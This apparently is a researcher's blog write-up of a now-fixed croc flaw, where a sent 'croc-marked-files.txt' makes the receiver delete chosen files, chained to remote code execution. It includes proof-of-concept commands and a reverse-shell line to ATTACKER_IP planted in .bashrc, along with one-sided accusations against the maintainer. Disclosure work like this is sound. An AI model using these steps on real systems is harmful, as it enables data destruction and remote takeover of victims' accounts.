---
title: "CrocTears: or How I Found an Arbitrary File Deletion That Can Be Escalated to RCE in croc"
date: 2026-08-12
draft: false
tags: [croc, go, file-deletion, path-traversal, rce, cve, 0day]
medium_url: "https://medium.com/@anassouiri07/croctears-or-how-i-found-an-arbitrary-file-deletion-that-can-be-escalated-to-rce-in-croc-0a4146a94454"
---

{{< img src="/img/croc-header.webp" path="/img/croc-header.webp" caption="fig.0 — submissive croc" >}}

{{< note >}}
The fix landed in under an hour (PR #1232), but that was a silent fix. The
commit carried no description, no security note, and no advisory — for a
vulnerability that turned out to be a two-year-old remote-code-execution chain.

The situation was made worse by the maintainer's subsequent handling of the
disclosure. The maintainer refused to request a CVE ID and refused to give me
credit for discovering and reporting the vulnerability. After several email
exchanges, I was ultimately told that I should have created a PR myself. That
is not an appropriate approach for a security vulnerability: a PR is public by
design and would have disclosed the vulnerability before there was an
appropriate coordinated disclosure process in place.

Taken together, this shows a serious lack of security-disclosure hygiene and
transparency toward users and security researchers. A vulnerability of this age
and severity should be communicated, not quietly buried in a diff.

I want to keep this focused on the technical write-up, but I have a lot more to
say about the maintainer of croc. Let's just say that he lacks maturity,
transparency, and honesty.
{{< /note >}}

## |=---[ TL;DR ]

croc, the end-to-end-encrypted file-transfer tool, trusted a predictable
filename in its working directory as an internal "delete these" list. A
malicious sender could send a file with that name with arbitrary file paths as
its content, causing the receiver to delete attacker-chosen files — absolute
paths and `../` traversal both work. When the victim receives into their home
directory, this can be chained to remote code execution by deleting and then
sending files like `.bashrc`.

```text
Affected:    croc 10.0.13 – 11.0.2
Fixed in:    11.0.3  (commit c0d51f0, PR #1232)
CVSS 3.1:    AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H  ->  8.1 (High)
```

## |=---[ Background Knowledge ]

croc lets two machines transfer files through a relay.

{{< img src="/img/croc-demo.gif" path="/img/croc-demo.gif" caption="fig.1 — croc in action: sender on the left, receiver on the right" >}}

The detail that matters: **received files land in the CWD, and the sender fully
controls their names and contents.**

## |=---[ The Bug: a magic filename in your working directory ]

To clean up temporary files, croc kept an on-disk list and deleted everything in
it on exit. In `src/utils/utils.go`:

```go
const crocRemovalFile = "croc-marked-files.txt"

func RemoveMarkedFiles() (err error) {
    f, err := os.Open(crocRemovalFile)   // fixed, RELATIVE path -> read from CWD
    ...
    for scanner.Scan() {
        fname := scanner.Text()
        err = os.Remove(fname)           // no validation, no CWD confinement
    }
    ...
}
```

`RemoveMarkedFiles()` runs on normal exit (`main.go:45`) and on Ctrl-C
(`main.go:51`). It reads `croc-marked-files.txt` from the current directory and
calls `os.Remove()` on every line, with no path validation and no confinement,
so absolute and relative paths both delete.

Hence, an attacker can send a file named `croc-marked-files.txt` that contains
file paths as its content. Once the victim receives it, those files get
automatically deleted.

## |=---[ PoC #1: Arbitrary File Deletion ]

Attacker crafts the list and sends it:

```bash
mkdir -p /tmp/attacker && cd /tmp/attacker
printf 'secret.txt\n../victim-sibling.txt\n/tmp/absolute-target.txt\n' > croc-marked-files.txt
croc send croc-marked-files.txt
```

Victim receives it into a directory with files they care about:

```bash
mkdir -p /tmp/victim && cd /tmp/victim
echo A > secret.txt
echo B > /tmp/victim-sibling.txt     # reached via ../
echo C > /tmp/absolute-target.txt    # absolute
CROC_SECRET=<code> croc --yes
```

On completion, all three targets are deleted.

## |=---[ PoC #2: Escalating to RCE ]

Deletion alone is destructive, but it also removes the one thing standing
between an attacker and code execution: **the overwrite prompt.**

croc won't silently overwrite an existing file. But if we delete the target
first, the follow-up write lands with no prompt. Targeting a shell init file
(e.g. `.bashrc`) leads to code execution.

**Transfer 1 — delete `~/.bashrc`:**

```bash
# attacker
printf '.bashrc\n' > croc-marked-files.txt
croc send croc-marked-files.txt

# victim (in $HOME)
CROC_SECRET=<code1> croc --yes    # ~/.bashrc deleted on exit
```

**Transfer 2 — plant a malicious `.bashrc`:**

```bash
# attacker
cat > .bashrc <<'EOF'
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
croc send .bashrc

# victim (in $HOME)
CROC_SECRET=<code2> croc --yes    # no overwrite prompt (file was deleted)
```

**Execution:** on the victim's next interactive shell / SSH login, `~/.bashrc`
is sourced and the payload runs as the victim.

### Screenshots

{{< img src="/img/croc-01-delete-bashrc.png" path="/img/croc-01-delete-bashrc.png" caption="fig.2 — attacker deletes .bashrc" >}}

{{< img src="/img/croc-02-plant-bashrc.png" path="/img/croc-02-plant-bashrc.png" caption="fig.3 — attacker sends new .bashrc" >}}

{{< img src="/img/croc-03-delivery.png" path="/img/croc-03-delivery.png" caption="fig.4 — victim gets its .bashrc file replaced" >}}

{{< img src="/img/croc-04-execution.png" path="/img/croc-04-execution.png" caption="fig.5 — next time the victim opens a shell, the attacker gets one too :D" >}}

{{< note >}}
The victim must run croc from $HOME so that its .bashrc is the one replaced —
received writes are confined to the working-directory subtree, but the delete
is not confined and accepts absolute and ../ paths. Two transfers must be
accepted: silent under --yes, otherwise the filenames appear in the accept
prompt.
{{< /note >}}

## |=---[ Vulnerability Classes ]

- **CWE-73:** External Control of File Name or Path — the sender controls the
  name and contents of the file used as the deletion list *(primary)*
- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory —
  the delete list honors `../` and absolute paths
- **CWE-94:** Improper Control of Generation of Code

## |=---[ Disclosure Timeline ]

```text
2026-08-10  02:07:00 GMT+2   reported via GitHub Security Advisory
2026-08-10  02:53:00 GMT+2   fix committed (c0d51f0)
2026-08-10  02:55:57 GMT+2   v11.0.3 published
later                        CVE requested from MITRE
```

## |=---[ Takeaway ]

- Don't work on projects that don't take security seriously.
- Some maintainers that claim and swear by open source will refuse to give you
  credit. Expose them! Expose them!

## |=---[ References ]

- Fix (PR): <https://github.com/schollz/croc/pull/1232>
- Fix commit: <https://github.com/schollz/croc/commit/c0d51f095e3bf91c94208c4db8101c4e60219b03>
- Release: <https://github.com/schollz/croc/releases/tag/v11.0.3>

Found by Anas SOUIRI ([@0x1nf0](https://twitter.com/0x1nf0)).
**Update to croc 11.0.3 or later.**
